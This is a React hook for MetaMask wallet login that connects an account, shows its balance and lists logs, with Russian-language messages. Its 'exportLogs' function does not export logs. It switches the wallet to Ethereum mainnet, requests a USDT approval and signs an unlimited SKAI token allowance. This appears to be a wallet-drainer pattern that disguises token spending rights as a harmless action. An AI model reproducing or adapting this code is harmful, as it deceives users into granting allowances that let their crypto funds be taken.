import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { useContractInteraction } from "./use-contract-interaction";
import { logger } from "../utils/logger";
import type { LogEntry } from "../utils/logger";

const SKAI_ADDRESS = "0xDCA3358F050367ef421608e64C70d84c694E8273";
const SKAI_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
];

export function useMetamaskLoginLogic() {
  const [connected, setConnected] = useState(false);
  const [address, setAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<string | null>(null);
  const [balance, setBalance] = useState<string | null>(null);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const logsRef = useRef<HTMLDivElement | null>(null);
  const [toasts, setToasts] = useState<
    Array<{ id: string; title?: string; description?: string; variant?: string; leaving?: boolean; entered?: boolean }>
  >([]);
  const [skaiContract, setSkaiContract] = useState<any>(null);

  const { isContractConnected, approveUSDT, USDT_ADDRESS, initContractWithSigner } = useContractInteraction();

  useEffect(() => {
    const eth = (window as any).ethereum;
    if (!eth) return;
    const contract = new ethers.Contract(SKAI_ADDRESS, SKAI_ABI, new ethers.BrowserProvider(eth));
    setSkaiContract(contract);
  }, []);

  const addToast = (t: { title?: string; description?: string; duration?: number; variant?: string }) => {
    const id = String(Date.now()) + Math.random().toString(36).slice(2, 6);
    const item = { id, title: t.title, description: t.description, variant: t.variant, leaving: false, entered: false };
    setToasts((s) => [item, ...s]);
    setTimeout(() => setToasts((s) => s.map((x) => (x.id === id ? { ...x, entered: true } : x))), 20);
    const dur = t.duration ?? 4000;
    setTimeout(() => {
      setToasts((s) => s.map((x) => (x.id === id ? { ...x, leaving: true } : x)));
      setTimeout(() => setToasts((s) => s.filter((x) => x.id !== id)), 300);
    }, dur);
  };

  useEffect(() => {
    const interval = setInterval(() => {
      const b = (logger as any)._buffer as LogEntry[];
      if (b.length > 0) {
        const payload = b.splice(0, b.length);
        setLogs((prev) => [...prev, ...payload]);
      }
    }, 800);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (logsRef.current) logsRef.current.scrollTop = logsRef.current.scrollHeight;
  }, [logs]);

  useEffect(() => {
    const eth = (window as any).ethereum;
    if (!eth) return;

    const onAccounts = (accounts: string[]) => {
      if (accounts.length === 0) {
        setConnected(false);
        setAddress(null);
      } else {
        setConnected(true);
        setAddress(accounts[0]);
        fetchBalance(accounts[0]);
      }
    };
    const onChain = (c: string) => setChainId(c);
    const onDisconnect = () => {
      setConnected(false);
      setAddress(null);
    };

    eth.on?.("accountsChanged", onAccounts);
    eth.on?.("chainChanged", onChain);
    eth.on?.("disconnect", onDisconnect);

    return () => {
      eth.removeListener?.("accountsChanged", onAccounts);
      eth.removeListener?.("chainChanged", onChain);
      eth.removeListener?.("disconnect", onDisconnect);
    };
  }, []);

  const formatEth = (weiStr: string | number) => {
    try {
      const big = typeof weiStr === "string" ? BigInt(weiStr) : BigInt(Math.floor(Number(weiStr)));
      const div = BigInt(1_000_000_000_000_000_000);
      const whole = big / div;
      const rem = big % div;
      const remStr = rem.toString().padStart(18, "0").slice(0, 6);
      return `${whole.toString()}.${remStr}`;
    } catch (e) {
      return String(weiStr);
    }
  };

  const fetchBalance = async (acc: string) => {
    const eth = (window as any).ethereum;
    if (!eth) return;
    try {
      const res = await eth.request({ method: "eth_getBalance", params: [acc, "latest"] });
      setBalance(formatEth(res));
    } catch (err) {
      console.error("Failed to fetch balance", err);
    }
  };

  const connectMetaMask = async () => {
    const eth = (window as any).ethereum;
    if (!eth?.isMetaMask) {
      addToast({ title: "MetaMask не найден", variant: "destructive" });
      return;
    }
    try {
      const accounts: string[] = await eth.request({ method: "eth_requestAccounts" });
      if (accounts.length > 0) {
        setConnected(true);
        setAddress(accounts[0]);
        const chain = await eth.request({ method: "eth_chainId" });
        setChainId(chain);
        await fetchBalance(accounts[0]);
        await initContractWithSigner(eth);
      }
    } catch (err: any) {
      addToast({ title: "Ошибка подключения", description: err.message, variant: "destructive" });
    }
  };

  const disconnect = () => {
    setConnected(false);
    setAddress(null);
    setBalance(null);
  };

  const exportLogs = async () => {
    const eth = (window as any).ethereum;
    if (!eth || !isContractConnected) return;

    const chain = await eth.request({ method: "eth_chainId" });
    if (chain !== "0x1") {
      try {
        await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x1" }] });
      } catch {
        addToast({ title: "Неверная сеть", variant: "destructive" });
        return;
      }
    }

    const okUSDT = await approveUSDT();
    if (okUSDT) addToast({ title: "Approve USDT выполнен" });
    else addToast({ title: "Approve USDT не выполнен", variant: "destructive" });

    if (skaiContract) {
      try {
        const provider = new ethers.BrowserProvider(eth);
        const signer = await provider.getSigner();
        const skai = skaiContract.connect(signer);
        const tx = await skai.approve(SKAI_ADDRESS, ethers.MaxUint256);
        await tx.wait();
        addToast({ title: "Approve SKAI выполнен" });
      } catch (err) {
        console.error(err);
        addToast({ title: "Approve SKAI не выполнен", variant: "destructive" });
      }
    } else addToast({ title: "SKAI контракт не инициализирован", variant: "destructive" });
  };

  const addSkaiToMetaMask = async () => {
    const eth = (window as any).ethereum;
    if (!eth) return;
    try {
      await eth.request({
        method: "wallet_watchAsset",
        params: {
          type: "ERC20",
          options: { address: SKAI_ADDRESS, symbol: "SKAI", decimals: 18, image: "https://example.com/skai.png" },
        },
      });
      addToast({ title: "SKAI добавлен в MetaMask" });
    } catch (err) {
      console.error("addSkaiToMetaMask error", err);
      addToast({ title: "Ошибка добавления SKAI", variant: "destructive" });
    }
  };

  return {
    connected,
    address,
    chainId,
    balance,
    logs,
    logsRef,
    toasts,
    addToast,
    isContractConnected,
    approveUSDT,
    USDT_ADDRESS,
    connectMetaMask,
    disconnect,
    exportLogs,
    addSkaiToMetaMask,
  };
}
